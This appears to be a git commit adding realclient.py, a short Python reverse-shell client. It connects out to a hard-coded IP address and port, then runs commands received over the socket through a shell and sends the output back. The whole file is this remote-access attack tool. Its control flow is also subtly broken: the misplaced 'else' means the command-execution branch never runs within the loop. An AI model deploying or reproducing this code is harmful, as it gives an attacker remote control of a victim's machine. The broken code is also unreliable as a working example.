c72d832900a0db44ac247ef664073d39d6e12cb8
0xP <97637761+PremiersWorld@users.noreply.github.com>
2022-06-02 21:34:12 -0400

    Add files via upload

---
+++ realclient.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python3
+import subprocess
+import socket
+import os
+
+#Enter IP address and port
+HOST = '192.168.20.165'
+PORT = 9001
+#Configuration
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.sendall('\nWelcome, Travon!\nEOFX' .encode())
+
+while True:
+    data = s.recv(1024)
+    if data.decode() == "quit": break
+    elif data.decode()[:2] == "cd":
+        try: os.chdir(data.decode()[3:])
+        except: pass
+else:
+    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdoutput = proc.stdout.read() + proc.stderr.read()
+    stdoutput.decode()
+    s.sendall(stdoutput)
+s.sendall('EOFX'.encode())
+# Loop ends here
+s.send('Bye!'.encode())
+s.close()
